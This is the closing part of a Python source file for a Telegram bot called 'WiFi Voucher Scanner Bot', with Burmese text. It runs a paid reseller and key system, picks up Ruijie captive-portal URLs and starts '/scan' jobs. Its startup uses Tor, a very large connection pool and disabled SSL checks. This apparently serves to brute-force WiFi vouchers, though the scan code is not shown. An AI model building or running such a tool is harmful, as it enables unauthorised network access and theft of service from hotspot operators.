        await bot.reply_to(message, f"✅ Key Generated (Admin)\n\nUser ID : {uid}\nPlan    : {plan}\nExpires : {fmt_expiry({'expires_at': exp})}")
    else:
        ok, res_data = await is_reseller(chat_id)
        if not ok:
            await bot.reply_to(message, "❌ Permission မရှိပါ"); return
        resellers, rsha = await gh_get("resellers.json")
        rdata = resellers.get(str(chat_id), {})
        bal = rdata.get("balance", 0)
        if bal <= 0:
            await bot.reply_to(message, f"❌ Credits ကုန်ပြီ (Balance: 0)\nAdmin ကို /topup တောင်းပါ"); return
        allowed_plans = ["30m","1h","1d","7d","1m"]
        if plan not in allowed_plans:
            await bot.reply_to(message, f"❌ Reseller plan: {'/'.join(allowed_plans)}"); return
        rdata["balance"] = bal - 1
        resellers[str(chat_id)] = rdata
        await gh_put("resellers.json", resellers, rsha, f"reseller {chat_id} genkey")
        auth, asha = await gh_get("auth_list.json")
        auth[uid] = {"expires_at": exp, "plan": plan, "by": str(chat_id)}
        await gh_put("auth_list.json", auth, asha, f"reseller genkey {uid}")
        await bot.reply_to(message, f"✅ Key Generated (Reseller)\n\nUser ID : {uid}\nPlan    : {plan}\nExpires : {fmt_expiry({'expires_at': exp})}\n\n💰 Remaining Credits: {rdata['balance']}")

@bot.message_handler(commands=["listkeys"])
async def cmd_listkeys(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission"); return
    auth, _ = await gh_get("auth_list.json")
    if not auth:
        await bot.reply_to(message, "User မရှိသေးပါ"); return
    lines = []
    for uid, data in auth.items():
        plan = data.get("plan","?") if isinstance(data, dict) else "old"
        by = data.get("by","admin") if isinstance(data, dict) else "admin"
        exp = fmt_expiry(data)
        lines.append(f"👤 {uid}\n   Plan: {plan} | By: {by}\n   {exp}")
    txt = f"📋 Users ({len(auth)})\n\n" + "\n\n".join(lines)
    for i in range(0, len(txt), 4096):
        await bot.send_message(message.chat.id, txt[i:i+4096])

@bot.message_handler(commands=["delkey"])
async def cmd_delkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission"); return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /delkey <user_id>"); return
    uid = args[1]
    auth, sha = await gh_get("auth_list.json")
    if uid not in auth:
        await bot.reply_to(message, f"❌ User {uid} မတွေ့ပါ"); return
    del auth[uid]
    await gh_put("auth_list.json", auth, sha, f"delkey {uid}")
    approve.pop(int(uid), None); user_data.pop(int(uid), None)
    await bot.reply_to(message, f"✅ Deleted: {uid}")

# ══════════════════════════════════════════════════════
#  BOT HANDLERS — RESELLER MANAGEMENT (Admin only)
# ══════════════════════════════════════════════════════
@bot.message_handler(commands=["addreseller"])
async def cmd_addreseller(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission"); return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage:\n/addreseller <user_id> <credits> [name]\n\nExample:\n/addreseller 123456789 10 MyReseller"); return
    uid, credits_str = args[1], args[2]
    name = " ".join(args[3:]) if len(args) > 3 else f"Reseller-{uid}"
    try: credits = int(credits_str)
    except: await bot.reply_to(message, "❌ Credits နံပါတ်ထည့်ပါ"); return
    resellers, sha = await gh_get("resellers.json")
    resellers[uid] = {
        "balance": credits,
        "name": name,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "created_by": ADMIN_ID
    }
    await gh_put("resellers.json", resellers, sha, f"add reseller {uid}")
    await bot.reply_to(message,
        f"✅ Reseller ထည့်ပြီး!\n\n"
        f"ID      : {uid}\n"
        f"Name    : {name}\n"
        f"Credits : {credits} keys\n\n"
        f"Reseller က /genkey <plan> <user_id> ဖြင့် key ထုတ်နိုင်သည်\n"
        f"Plans: 30m/1h/1d/7d/1m (unlimited မရ)")

@bot.message_handler(commands=["topup"])
async def cmd_topup(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission"); return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage: /topup <reseller_id> <amount>"); return
    uid, amount_str = args[1], args[2]
    try: amount = int(amount_str)
    except: await bot.reply_to(message, "❌ Amount နံပါတ်ထည့်ပါ"); return
    resellers, sha = await gh_get("resellers.json")
    if uid not in resellers:
        await bot.reply_to(message, f"❌ Reseller {uid} မတွေ့ပါ"); return
    old_bal = resellers[uid].get("balance", 0)
    resellers[uid]["balance"] = old_bal + amount
    await gh_put("resellers.json", resellers, sha, f"topup {uid} +{amount}")
    await bot.reply_to(message,
        f"✅ Top Up ပြီး!\n\n"
        f"Reseller : {resellers[uid].get('name','?')}\n"
        f"ID       : {uid}\n"
        f"Before   : {old_bal} credits\n"
        f"Added    : +{amount}\n"
        f"Now      : {resellers[uid]['balance']} credits")
    try:
        await bot.send_message(int(uid),
            f"💰 Credits Top Up!\n\n"
            f"+{amount} credits ထည့်ပေးပြီ\n"
            f"Total: {resellers[uid]['balance']} credits\n\n"
            f"/mybalance ဖြင့် ကြည့်နိုင်သည်")
    except: pass

@bot.message_handler(commands=["listresellers"])
async def cmd_listresellers(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission"); return
    resellers, _ = await gh_get("resellers.json")
    if not resellers:
        await bot.reply_to(message, "Reseller မရှိသေးပါ"); return
    auth, _ = await gh_get("auth_list.json")
    lines = []
    for uid, d in resellers.items():
        user_count = sum(1 for u in auth.values() if isinstance(u, dict) and u.get("by") == uid)
        lines.append(
            f"👤 {d.get('name','?')} [{uid}]\n"
            f"   💰 Balance : {d.get('balance',0)} credits\n"
            f"   👥 Users   : {user_count}\n"
            f"   📅 Added   : {d.get('created_at','?')[:10]}"
        )
    txt = f"📋 Resellers ({len(resellers)})\n\n" + "\n\n".join(lines)
    await bot.reply_to(message, txt)

@bot.message_handler(commands=["delreseller"])
async def cmd_delreseller(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission"); return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /delreseller <reseller_id>"); return
    uid = args[1]
    resellers, sha = await gh_get("resellers.json")
    if uid not in resellers:
        await bot.reply_to(message, f"❌ Reseller {uid} မတွေ့ပါ"); return
    name = resellers[uid].get("name","?")
    del resellers[uid]
    await gh_put("resellers.json", resellers, sha, f"del reseller {uid}")
    await bot.reply_to(message, f"✅ Reseller Deleted\n\n{name} [{uid}]")

# ══════════════════════════════════════════════════════
#  BOT HANDLERS — RESELLER SELF-SERVICE
# ══════════════════════════════════════════════════════
@bot.message_handler(commands=["mybalance"])
async def cmd_mybalance(message):
    chat_id = message.chat.id
    if is_admin(chat_id):
        await bot.reply_to(message, "👑 Admin — Unlimited"); return
    resellers, _ = await gh_get("resellers.json")
    d = resellers.get(str(chat_id))
    if not d:
        await bot.reply_to(message, "❌ Reseller မဟုတ်ပါ"); return
    auth, _ = await gh_get("auth_list.json")
    user_count = sum(1 for u in auth.values() if isinstance(u, dict) and u.get("by") == str(chat_id))
    await bot.reply_to(message,
        f"💰 My Balance\n\n"
        f"Name     : {d.get('name','?')}\n"
        f"Credits  : {d.get('balance',0)} remaining\n"
        f"My Users : {user_count}\n\n"
        f"Key ထုတ်ရန်: /genkey <plan> <user_id>\n"
        f"Plans: 30m / 1h / 1d / 7d / 1m")

@bot.message_handler(commands=["myusers"])
async def cmd_myusers(message):
    chat_id = message.chat.id
    resellers, _ = await gh_get("resellers.json")
    if str(chat_id) not in resellers and not is_admin(chat_id):
        await bot.reply_to(message, "❌ Reseller မဟုတ်ပါ"); return
    auth, _ = await gh_get("auth_list.json")
    if is_admin(chat_id):
        mine = {uid: d for uid, d in auth.items() if isinstance(d, dict) and d.get("by") == "admin"}
    else:
        mine = {uid: d for uid, d in auth.items() if isinstance(d, dict) and d.get("by") == str(chat_id)}
    if not mine:
        await bot.reply_to(message, "📭 ထည့်ပေးထားသော user မရှိသေးပါ"); return
    lines = []
    for uid, d in mine.items():
        plan = d.get("plan","?")
        exp = fmt_expiry(d)
        lines.append(f"👤 {uid}\n   Plan: {plan} | {exp}")
    txt = f"📋 My Users ({len(mine)})\n\n" + "\n\n".join(lines)
    for i in range(0, len(txt), 4096):
        await bot.send_message(chat_id, txt[i:i+4096])

@bot.message_handler(commands=["resdel"])
async def cmd_resdel(message):
    """Reseller က သူ့ user ကို ဖျက်နိုင်သည်"""
    chat_id = message.chat.id
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /resdel <user_id>"); return
    ok, _ = await is_reseller(chat_id)
    if not ok and not is_admin(chat_id):
        await bot.reply_to(message, "❌ Permission မရှိ"); return
    uid = args[1]
    auth, sha = await gh_get("auth_list.json")
    rec = auth.get(uid)
    if not rec:
        await bot.reply_to(message, f"❌ User {uid} မတွေ့ပါ"); return
    if not is_admin(chat_id) and rec.get("by") != str(chat_id):
        await bot.reply_to(message, "❌ သင်မထည့်ပေးသော user ကို မဖျက်နိုင်ပါ"); return
    del auth[uid]
    await gh_put("auth_list.json", auth, sha, f"resdel {uid}")
    approve.pop(int(uid), None); user_data.pop(int(uid), None)
    await bot.reply_to(message, f"✅ Deleted: {uid}")

# ══════════════════════════════════════════════════════
#  PLAIN TEXT HANDLERS — URL auto-detect + guide
# ══════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text and (
    "ruijienetworks.com" in m.text or
    ("portal" in m.text.lower() and "http" in m.text.lower() and "mac=" in m.text.lower())
))
async def handle_plain_url(message):
    await process_url(message, message.text.strip())

@bot.message_handler(func=lambda m: m.text and not m.text.startswith("/"))
async def handle_plain_text(message):
    chat_id = message.chat.id
    txt = message.text.strip()
    if txt.startswith("http"):
        await bot.reply_to(message, "🔗 URL တွေ့ပါသည်\nRuijie portal URL မဟုတ်ပါ\n\nURL ပုံစံ: https://portal-as.ruijienetworks.com/api/auth/wifidog?...")
        return
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "👋 ဦးစွာ /key နှိပ်ပါ\nပြီးနောက် WiFi portal URL ကို paste လုပ်ပါ")
    elif chat_id not in user_data or "session_url" not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "📌 WiFi portal URL ကို paste လုပ်ပြီး /scan 6 နှိပ်ပါ")
    else:
        await bot.reply_to(message, "💡 /scan 6 နှိပ်ပါ · /stop ရပ်ရန် · /result ရလဒ်")

# ══════════════════════════════════════════════════════
#  POLLING
# ══════════════════════════════════════════════════════
async def start_polling():
    backoff = 2
    while True:
        try:
            print("Bot polling started...")
            await bot.polling(non_stop=True, interval=0, timeout=30, request_timeout=60)
        except Exception as e:
            print(f"[polling] {e} — retry in {backoff}s")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

# ══════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════
async def main():
    global session, _connector
    print("=" * 50)
    print("  WiFi Voucher Scanner Bot — Starting...")
    print("=" * 50)

    tor_ok = await start_tor()
    if tor_ok:
        print("🧅 Tor proxy active")
        _connector = make_connector()
    else:
        print("⚡ Direct connection mode")
        _connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)

    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=aiohttp.TCPConnector(limit=100, ssl=False),
        connector_owner=True
    )

    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_scheduler())
        await start_polling()
    finally:
        await session.close()
        if _connector and not _connector.closed:
            await _connector.close()
        if _tor_process:
            _tor_process.terminate()

if __name__ == "__main__":
    asyncio.run(main())
